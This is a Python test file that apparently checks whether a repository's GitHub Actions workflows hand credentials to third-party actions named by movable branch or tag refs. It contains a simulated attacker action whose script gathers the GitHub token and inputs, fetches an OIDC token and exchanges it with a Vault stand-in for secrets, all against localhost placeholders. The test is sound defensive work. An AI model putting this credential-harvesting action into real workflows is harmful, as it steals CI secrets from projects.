#!/usr/bin/env python3
"""Credential delivery to actions referenced by a moving git ref.

The scheduled Crowdin download workflow, and every other workflow in this
repository that shares that pattern, checks out an action or reusable
workflow with `uses: owner/name[/path]@ref`. When `ref` is not a full
commit SHA, the runner asks the service for the commit at download time and
then runs that commit's definition
(actions/runner v2.338.2 ActionManager.GetDownloadInfoAsync and
DownloadRepositoryActionAsync; ActionManifestManagerWrapper.ParseActionReference).

Composite steps may read `github.token` and the inputs the workflow already
evaluated (action_yaml.json step-env context; ExecutionContext copies
github.token from system.github.token). Script steps in a job whose
permissions set id-token to write also receive ACTIONS_ID_TOKEN_REQUEST_URL
(ScriptHandler). Those are the values a commit pushed to the ref can store.

This test moves the ref after the job has started and before each download,
which is the lookup the runner repeats at download time. A workflow that
still names the branch or tag fails. A workflow that names a commit SHA
keeps the commit that was current when the ref was recorded.

Left untested on purpose:
- uses of actions/* and github/* (for example actions/checkout@v5,
  actions/checkout@v6, actions/download-artifact@v8, actions/cache@v5).
  Those refs are also mutable, and they run in the same jobs, but the
  attacker who can push the Grafana action repositories cannot push them.
- uses of grafana/grafana/.github/workflows/*.yml@main (publish-artifact,
  deploy-storybook, create-next-release-branch, create-security-branch,
  migrate-prs, github-release). The caller and the callee are the same
  repository, so a push to that branch can already change the caller.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import tempfile
import textwrap
import threading
import unittest
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import yaml


REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = REPO_ROOT / ".github" / "workflows"
SHA = re.compile(r"^[0-9a-f]{40}$")
EXPR = re.compile(r"\$\{\{\s*(.*?)\s*\}\}", re.DOTALL)
OIDC_REQUEST_TOKEN = "PLACEHOLDER_OIDC_REQUEST_TOKEN"
OIDC_JWT = "PLACEHOLDER_OIDC_JWT"
GITHUB_TOKEN = "PLACEHOLDER_GITHUB_TOKEN"

# owners the finding's attacker cannot update, or the workflow repository itself
EXCLUDED_OWNERS = {"actions", "github"}
SAME_REPOSITORY = "grafana/grafana"


class Loader(yaml.SafeLoader):
    pass


# Keep the workflow key "on" as a string. SafeLoader would treat it as a bool.
for first, resolvers in list(Loader.yaml_implicit_resolvers.items()):
    Loader.yaml_implicit_resolvers[first] = [
        item for item in resolvers if item[0] != "tag:yaml.org,2002:bool"
    ]


def load_yaml(text: str):
    return yaml.load(text, Loader=Loader)


def git(repo: Path, *args: str, check: bool = True) -> str:
    result = subprocess.run(
        ["git", "-C", str(repo), *args],
        check=False,
        text=True,
        capture_output=True,
    )
    if check and result.returncode != 0:
        raise AssertionError(f"git {' '.join(args)} failed: {result.stderr}")
    return result.stdout.strip()


def split_uses(uses: str):
    """Match ActionManifestManagerWrapper.ParseActionReference."""
    at = uses.rfind("@")
    if at <= 0:
        return None
    ref = uses[at + 1 :]
    parts = uses[:at].split("/")
    if len(parts) < 2 or not parts[0] or not parts[1] or not ref:
        return None
    name = f"{parts[0]}/{parts[1]}"
    path = "/".join(parts[2:])
    return name, path, ref


def in_scope(uses: str) -> bool:
    if uses.startswith("./") or uses.startswith(".\\") or uses.startswith("docker://"):
        return False
    parsed = split_uses(uses)
    if parsed is None:
        return False
    name, _path, ref = parsed
    owner = name.split("/")[0]
    if owner in EXCLUDED_OWNERS or name == SAME_REPOSITORY:
        return False
    return SHA.fullmatch(ref) is None


def ref_candidates(ref: str):
    if "/" in ref:
        return [f"refs/tags/{ref}", f"refs/heads/{ref}"]
    return [f"refs/heads/{ref}", f"refs/tags/{ref}"]


def render(value, ctx: dict) -> str:
    if not isinstance(value, str) or "${{" not in value:
        return "" if value is None else str(value)

    def replace(match: re.Match) -> str:
        return stringify(evaluate(match.group(1).strip(), ctx))

    return EXPR.sub(replace, value)


def stringify(value) -> str:
    if value is None:
        return ""
    if isinstance(value, (dict, list)):
        return json.dumps(value, separators=(",", ":"))
    return str(value)


def evaluate(expr: str, ctx: dict):
    parsed = re.fullmatch(r"fromJSON\(([^()]*)\)\.([A-Za-z0-9_-]+)", expr)
    if parsed:
        inner = evaluate(parsed.group(1).strip(), ctx)
        if isinstance(inner, str) and inner:
            try:
                inner = json.loads(inner)
            except json.JSONDecodeError:
                return ""
        if isinstance(inner, dict):
            return inner.get(parsed.group(2), "")
        return ""
    for pattern, root in (
        (r"steps\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)", "steps"),
        (r"needs\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)", "needs"),
    ):
        parsed = re.fullmatch(pattern, expr)
        if parsed:
            return (
                ctx.get(root, {})
                .get(parsed.group(1), {})
                .get("outputs", {})
                .get(parsed.group(2), "")
            )
    for pattern, root in (
        (r"inputs\.([A-Za-z0-9_-]+)", "inputs"),
        (r"secrets\.([A-Za-z0-9_-]+)", "secrets"),
        (r"github\.([A-Za-z0-9_-]+)", "github"),
    ):
        parsed = re.fullmatch(pattern, expr)
        if parsed:
            return ctx.get(root, {}).get(parsed.group(1), "")
    return "${{ " + expr + " }}"


def id_token_write(workflow: dict, job: dict) -> bool:
    """WorkflowTemplateConverter.ConvertToPermissions, job value wins."""
    permissions = job.get("permissions")
    if permissions is None:
        permissions = workflow.get("permissions")
    if permissions == "write-all":
        return True
    if isinstance(permissions, dict):
        return permissions.get("id-token") == "write"
    return False


def manifest_path(path: str, kind: str) -> str:
    # ActionManager prefers action.yml over action.yaml.
    if kind == "workflow":
        return path
    if path:
        return f"{path}/action.yml"
    return "action.yml"


def env_name(prefix: str, key: str) -> str:
    return prefix + re.sub(r"[^A-Za-z0-9_]", "_", key)


SINK_PROGRAM = r"""
python3 - << 'PY'
import json, os, urllib.parse, urllib.request
sink = os.environ["CREDENTIAL_SINK_FILE"]
chunks = ["FROM " + os.environ.get("SINK_USES", "")]
for key in sorted(os.environ):
    if key.startswith("STOLEN_") or key.startswith("IN_"):
        chunks.append(os.environ[key])
url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
request_token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
repo_secrets = os.environ.get("IN_repo_secrets", "")
vault = os.environ.get("VAULT_STANDIN_URL", "")
if url and request_token:
    chunks.append(request_token)
    audience = urllib.parse.quote("vault-github-actions-grafana-ops")
    oidc = urllib.request.Request(
        f"{url}&audience={audience}",
        headers={"Authorization": f"Bearer {request_token}"},
    )
    with urllib.request.urlopen(oidc, timeout=5) as response:
        payload = json.loads(response.read().decode())
    jwt = payload["value"]
    chunks.append(jwt)
    if repo_secrets and vault:
        exchange = urllib.request.Request(
            vault,
            data=repo_secrets.encode(),
            headers={"Authorization": f"Bearer {jwt}"},
        )
        with urllib.request.urlopen(exchange, timeout=5) as response:
            body = response.read().decode()
        chunks.append(body)
        with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
            output.write("secrets=" + body + "\n")
with open(sink, "a", encoding="utf-8") as handle:
    handle.write("\n".join(chunks) + "\n")
PY
"""


def action_manifest(input_keys) -> str:
    env_lines = ["        STOLEN_GITHUB_TOKEN: ${{ github.token }}"]
    for key in sorted(input_keys):
        env_lines.append(f"        {env_name('IN_', key)}: ${{{{ inputs.{key} }}}}")
    body = "\n".join(env_lines)
    script = textwrap.indent(SINK_PROGRAM.strip("\n"), "        ")
    return (
        "name: sink\n"
        "runs:\n"
        "  using: composite\n"
        "  steps:\n"
        "    - shell: bash\n"
        "      env:\n"
        f"{body}\n"
        "      run: |\n"
        f"{script}\n"
    )


def workflow_manifest(input_keys, secret_keys) -> str:
    env_lines = ["          STOLEN_GITHUB_TOKEN: ${{ github.token }}"]
    for key in sorted(input_keys):
        env_lines.append(f"          {env_name('IN_', key)}: ${{{{ inputs.{key} }}}}")
    for key in sorted(secret_keys):
        env_lines.append(
            f"          {env_name('STOLEN_SECRET_', key)}: ${{{{ secrets.{key} }}}}"
        )
    body = "\n".join(env_lines)
    script = textwrap.indent(SINK_PROGRAM.strip("\n"), "          ")
    return (
        "name: sink\n"
        "on:\n"
        "  workflow_call:\n"
        "permissions:\n"
        "  contents: read\n"
        "  id-token: write\n"
        "jobs:\n"
        "  main:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - shell: bash\n"
        "        env:\n"
        f"{body}\n"
        "        run: |\n"
        f"{script}\n"
    )


class OIDCAndVault(BaseHTTPRequestHandler):
    """Stand-in for the OIDC endpoint get-id-token.js calls and for Vault."""

    def log_message(self, fmt, *args):
        return

    def _send(self, status: int, body: bytes):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        auth = self.headers.get("Authorization", "")
        if auth != f"Bearer {OIDC_REQUEST_TOKEN}":
            self._send(401, b"{}")
            return
        self._send(200, json.dumps({"value": OIDC_JWT}).encode())

    def do_POST(self):
        auth = self.headers.get("Authorization", "")
        if auth != f"Bearer {OIDC_JWT}":
            self._send(401, b"{}")
            return
        length = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(length).decode()
        secrets = {}
        for line in raw.splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, _path = line.split("=", 1)
            key = key.strip()
            if key:
                secrets[key] = f"PLACEHOLDER_SECRET_{key}"
        self._send(200, json.dumps(secrets, separators=(",", ":")).encode())


class Harness:
    def __init__(self):
        self.root = Path(tempfile.mkdtemp(prefix="action-ref-"))
        self.repos = {}
        self.sink_file = self.root / "sink.txt"
        self.sink_file.write_text("")
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), OIDCAndVault)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        port = self.server.server_address[1]
        self.oidc_url = f"http://127.0.0.1:{port}/oidc?dummy=1"
        self.vault_url = f"http://127.0.0.1:{port}/vault"
        self.moving_occurrences = 0
        self.sink_runs = 0
        self.races = []

    def close(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)
        shutil.rmtree(self.root, ignore_errors=True)

    def ensure_repo(self, name: str, files: dict, refs: set):
        if name in self.repos:
            return
        repo = self.root / "repos" / name
        repo.mkdir(parents=True)
        git(repo, "init", "-b", "main")
        git(repo, "config", "user.email", "test@example.com")
        git(repo, "config", "user.name", "test")
        (repo / ".keep").write_text("benign\n")
        git(repo, "add", ".keep")
        git(repo, "commit", "-m", "benign")
        benign = git(repo, "rev-parse", "HEAD")
        for relative, content in files.items():
            destination = repo / relative
            destination.parent.mkdir(parents=True, exist_ok=True)
            destination.write_text(content)
            git(repo, "add", "--", relative)
        git(repo, "commit", "-m", "attacker")
        sink = git(repo, "rev-parse", "HEAD")
        git(repo, "update-ref", "refs/heads/main", benign)
        for ref in refs:
            for candidate in ref_candidates(ref):
                git(repo, "update-ref", candidate, benign)
        self.repos[name] = {"path": repo, "benign": benign, "sink": sink, "refs": set(refs)}

    def reset_refs(self, name: str):
        spec = self.repos[name]
        for ref in spec["refs"]:
            for candidate in ref_candidates(ref):
                git(spec["path"], "update-ref", candidate, spec["benign"])

    def rev_parse(self, name: str, ref: str) -> str:
        repo = self.repos[name]["path"]
        if SHA.fullmatch(ref):
            return ref
        for candidate in ref_candidates(ref):
            found = git(repo, "rev-parse", "--verify", "--quiet", candidate, check=False)
            if found:
                return found
        raise AssertionError(f"ref {ref} is missing in {name}")

    def move_ref(self, name: str, ref: str):
        if SHA.fullmatch(ref):
            return
        spec = self.repos[name]
        for candidate in ref_candidates(ref):
            git(spec["path"], "update-ref", candidate, spec["sink"])

    def show(self, name: str, sha: str, relative: str) -> str | None:
        repo = self.repos[name]["path"]
        result = subprocess.run(
            ["git", "-C", str(repo), "show", f"{sha}:{relative}"],
            check=False,
            text=True,
            capture_output=True,
        )
        if result.returncode != 0:
            return None
        return result.stdout

    def trusted_outputs(self, path: str, inputs: dict) -> dict:
        outputs = {}
        leaf = path.rsplit("/", 1)[-1]
        if leaf == "create-github-app-token":
            app = inputs.get("github_app") or "unknown"
            outputs["token"] = f"PLACEHOLDER_APP_TOKEN_{app}"
        if leaf == "get-vault-secrets":
            secrets = {}
            for line in (inputs.get("repo_secrets") or "").splitlines():
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, _secret_path = line.split("=", 1)
                key = key.strip()
                secrets[key] = f"PLACEHOLDER_SECRET_{key}"
            outputs["secrets"] = json.dumps(secrets, separators=(",", ":"))
        return outputs

    def run_definition(self, uses: str, document: dict, kind: str, job_ctx: dict, passed_inputs: dict, oidc: bool):
        self.sink_runs += 1
        if kind == "workflow":
            job = next(iter(document["jobs"].values()))
            step = job["steps"][0]
            action_ctx = {
                "github": job_ctx["github"],
                "inputs": passed_inputs,
                "secrets": job_ctx["secrets"],
            }
        else:
            step = document["runs"]["steps"][0]
            # Composite step-env allows github and inputs, not secrets.
            action_ctx = {"github": job_ctx["github"], "inputs": passed_inputs, "secrets": {}}
        env = {
            "PATH": os.environ.get("PATH", ""),
            "CREDENTIAL_SINK_FILE": str(self.sink_file),
            "VAULT_STANDIN_URL": self.vault_url,
            "SINK_USES": uses,
            "GITHUB_OUTPUT": str(self.root / "github-output.txt"),
        }
        Path(env["GITHUB_OUTPUT"]).write_text("")
        if oidc:
            # ScriptHandler copies GenerateIdTokenUrl onto every script step.
            env["ACTIONS_ID_TOKEN_REQUEST_URL"] = self.oidc_url
            env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = OIDC_REQUEST_TOKEN
        for key, value in (step.get("env") or {}).items():
            env[key] = render(value, action_ctx)
        script = self.root / "step.sh"
        script.write_text(step["run"] if isinstance(step["run"], str) else "")
        result = subprocess.run(
            ["bash", str(script)],
            check=False,
            text=True,
            capture_output=True,
            env=env,
        )
        if result.returncode != 0:
            raise AssertionError(f"{uses} sink exited {result.returncode}: {result.stderr}")
        outputs = {}
        for line in Path(env["GITHUB_OUTPUT"]).read_text().splitlines():
            if "=" in line:
                key, value = line.split("=", 1)
                outputs[key] = value
        return outputs

    def resolve_and_run(self, uses: str, job_ctx: dict, passed: dict, secret_values: dict, oidc: bool, start_shas: dict):
        name, path, ref = split_uses(uses)
        kind = "workflow" if path.endswith((".yml", ".yaml")) else "action"
        if SHA.fullmatch(ref):
            return self.trusted_outputs(path, passed)
        self.moving_occurrences += 1
        start = start_shas[(name, ref)]
        # The attacker pushes after any check the job already performed.
        self.move_ref(name, ref)
        downloaded = self.rev_parse(name, ref)
        self.races.append((uses, start, downloaded))
        if start == downloaded:
            raise AssertionError(f"{uses} was resolved before the ref moved")
        relative = manifest_path(path, kind)
        text = self.show(name, downloaded, relative)
        if text is None:
            raise AssertionError(f"{uses} resolved to {downloaded} which has no {relative}")
        document = load_yaml(text)
        outputs = self.run_definition(uses, document, kind, job_ctx, passed, oidc)
        if kind == "action" and path.endswith("get-vault-secrets") and "secrets" not in outputs:
            raise AssertionError("vault action did not publish secrets")
        return outputs

    def run_workflow(self, workflow: dict):
        jobs = workflow.get("jobs") or {}
        if not isinstance(jobs, dict):
            return
        for job_id, job in jobs.items():
            if not isinstance(job, dict):
                continue
            oidc = id_token_write(workflow, job)
            involved = []
            if isinstance(job.get("uses"), str) and in_scope(job["uses"]):
                involved.append(job["uses"])
            for step in job.get("steps") or []:
                if isinstance(step, dict) and isinstance(step.get("uses"), str) and in_scope(step["uses"]):
                    involved.append(step["uses"])
            start_shas = {}
            seen = set()
            for uses in involved:
                name, _path, ref = split_uses(uses)
                if (name, ref) in seen:
                    continue
                seen.add((name, ref))
                self.reset_refs(name)
                start_shas[(name, ref)] = self.rev_parse(name, ref)
            job_ctx = {
                "github": {"token": GITHUB_TOKEN, "repository": "grafana/grafana", "ref_name": "main"},
                "secrets": {"GITHUB_TOKEN": GITHUB_TOKEN},
                "steps": {},
                "inputs": {},
                "needs": {},
            }
            if isinstance(job.get("uses"), str):
                self._run_uses(job["uses"], job.get("with") or {}, job.get("secrets") or {}, job_ctx, oidc, start_shas)
                continue
            for step in job.get("steps") or []:
                if not isinstance(step, dict) or not isinstance(step.get("uses"), str):
                    continue
                outputs = self._run_uses(
                    step["uses"], step.get("with") or {}, {}, job_ctx, oidc, start_shas
                )
                step_id = step.get("id")
                if step_id and outputs:
                    job_ctx["steps"][step_id] = {"outputs": outputs}

    def _run_uses(self, uses: str, with_map, secrets_map, job_ctx, oidc, start_shas):
        passed = {key: render(value, job_ctx) for key, value in (with_map or {}).items()}
        if isinstance(secrets_map, dict):
            for key, value in secrets_map.items():
                job_ctx["secrets"][key] = render(value, job_ctx)
        if not in_scope(uses):
            name_path = split_uses(uses) if isinstance(uses, str) and "@" in uses else None
            if name_path and SHA.fullmatch(name_path[2]):
                return self.trusted_outputs(name_path[1], passed)
            return {}
        return self.resolve_and_run(uses, job_ctx, passed, job_ctx["secrets"], oidc, start_shas)


def collect_repo_specs(workflows: list[tuple[str, dict]]):
    specs = {}
    for _path, workflow in workflows:
        for job in (workflow.get("jobs") or {}).values():
            if not isinstance(job, dict):
                continue
            uses_blocks = []
            if isinstance(job.get("uses"), str):
                uses_blocks.append((job["uses"], job.get("with") or {}, job.get("secrets") or {}))
            for step in job.get("steps") or []:
                if isinstance(step, dict) and isinstance(step.get("uses"), str):
                    uses_blocks.append((step["uses"], step.get("with") or {}, {}))
            for uses, with_map, secrets_map in uses_blocks:
                if not in_scope(uses):
                    continue
                name, path, ref = split_uses(uses)
                kind = "workflow" if path.endswith((".yml", ".yaml")) else "action"
                spec = specs.setdefault(name, {"refs": set(), "files": {}, "inputs": {}, "secrets": {}})
                spec["refs"].add(ref)
                spec["inputs"].setdefault(path, set()).update((with_map or {}).keys())
                if isinstance(secrets_map, dict):
                    spec["secrets"].setdefault(path, set()).update(secrets_map.keys())
                spec["secrets"].setdefault(path, set()).add("GITHUB_TOKEN")
                spec["files"][path] = kind
    return specs


def build_harness(workflows: list[tuple[str, dict]]) -> Harness:
    harness = Harness()
    for name, spec in collect_repo_specs(workflows).items():
        files = {}
        for path, kind in spec["files"].items():
            relative = manifest_path(path, kind)
            if kind == "workflow":
                files[relative] = workflow_manifest(spec["inputs"].get(path, ()), spec["secrets"].get(path, ()))
            else:
                files[relative] = action_manifest(spec["inputs"].get(path, ()))
        harness.ensure_repo(name, files, spec["refs"])
    return harness


def load_repository_workflows():
    loaded = []
    for path in sorted(WORKFLOWS.glob("*.yml")) + sorted(WORKFLOWS.glob("*.yaml")):
        if path.name == Path(__file__).name:
            continue
        document = load_yaml(path.read_text())
        if isinstance(document, dict) and isinstance(document.get("jobs"), dict):
            loaded.append((str(path), document))
    return loaded


class UnpinnedActionCredentialTests(unittest.TestCase):
    def test_pinned_sha_does_not_receive_credentials_when_the_branch_moves(self):
        repo = Path(tempfile.mkdtemp(prefix="pinned-action-"))
        self.addCleanup(lambda: shutil.rmtree(repo, ignore_errors=True))
        git(repo, "init", "-b", "main")
        git(repo, "config", "user.email", "test@example.com")
        git(repo, "config", "user.name", "test")
        (repo / ".keep").write_text("benign\n")
        git(repo, "add", ".keep")
        git(repo, "commit", "-m", "benign")
        benign = git(repo, "rev-parse", "HEAD")
        workflow = {
            "name": "pinned",
            "on": {"workflow_dispatch": None},
            "jobs": {
                "main": {
                    "runs-on": "ubuntu-latest",
                    "permissions": {"contents": "read", "id-token": "write"},
                    "steps": [
                        {
                            "id": "token",
                            "uses": f"example/action@{benign}",
                            "with": {"github_app": "grafana-pr-approver"},
                        }
                    ],
                }
            },
        }
        harness = Harness()
        self.addCleanup(harness.close)
        # The branch tip is an attacker commit. The workflow names the benign SHA.
        (repo / "action.yml").write_text(action_manifest({"github_app"}))
        git(repo, "add", "action.yml")
        git(repo, "commit", "-m", "attacker")
        sink = git(repo, "rev-parse", "HEAD")
        git(repo, "update-ref", "refs/heads/main", benign)
        harness.repos["example/action"] = {
            "path": repo,
            "benign": benign,
            "sink": sink,
            "refs": {"main"},
        }
        harness.run_workflow(workflow)
        self.assertEqual(harness.sink_runs, 0)
        self.assertNotIn("PLACEHOLDER_", harness.sink_file.read_text())
        self.assertNotEqual(git(repo, "rev-parse", "refs/heads/main"), sink)

    def test_workflows_do_not_deliver_credentials_to_refs_resolved_at_download(self):
        workflows = load_repository_workflows()
        harness = build_harness(workflows)
        self.addCleanup(harness.close)
        for _path, document in workflows:
            harness.run_workflow(document)
        sink = harness.sink_file.read_text()
        self.assertEqual(
            harness.sink_runs,
            harness.moving_occurrences,
            "a moving ref was not executed, so an empty capture would not mean the ref is safe",
        )
        for uses, start, downloaded in harness.races:
            self.assertNotEqual(
                start,
                downloaded,
                f"{uses} used the commit observed at job start instead of the commit at download",
            )
        self.assertNotIn("PLACEHOLDER_GITHUB_TOKEN", sink, sink)
        self.assertNotIn("PLACEHOLDER_OIDC_JWT", sink, sink)
        self.assertNotIn("PLACEHOLDER_OIDC_REQUEST_TOKEN", sink, sink)
        self.assertNotIn("PLACEHOLDER_SECRET_CROWDIN_TOKEN", sink, sink)
        self.assertNotIn("PLACEHOLDER_APP_TOKEN_grafana-pr-approver", sink, sink)
        self.assertNotIn("PLACEHOLDER_APP_TOKEN_grafana-pr-automation", sink, sink)
        self.assertNotIn("PLACEHOLDER_", sink, sink)


if __name__ == "__main__":
    unittest.main()
